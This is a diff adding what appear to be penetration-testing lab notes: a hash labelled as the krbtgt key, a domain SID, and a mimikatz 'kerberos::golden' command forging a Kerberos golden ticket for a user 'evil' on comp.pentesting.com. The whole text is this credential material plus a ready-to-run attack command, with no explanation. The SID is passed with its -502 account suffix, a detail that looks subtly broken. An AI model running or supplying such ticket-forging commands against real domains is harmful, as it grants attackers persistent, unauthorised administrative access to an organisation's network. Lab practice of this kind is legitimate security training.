@@ -1,0 +1,7 @@
+Hash:
+eb3cf5e5d5eb8a7ad89e25c69dd3ebd1
+
+SID:
+S-1-5-21-806717010-4246441348-1666508686-502
+
+kerberos::golden /user:evil /domain:comp.pentesting.com /sid:S-1-5-21-806717010-4246441348-1666508686-502 /krbtgt:eb3cf5e5d5eb8a7ad89e25c69dd3ebd1
